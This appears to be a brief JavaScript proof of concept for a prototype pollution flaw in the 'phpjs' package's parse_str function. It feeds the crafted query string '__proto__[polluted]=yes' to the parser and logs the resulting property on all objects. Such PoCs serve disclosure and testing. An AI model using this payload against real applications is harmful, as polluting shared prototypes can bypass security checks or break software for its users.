var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const p = require('phpjs');
p.parse_str('__proto__[polluted]=yes', obj);
console.log({}.polluted);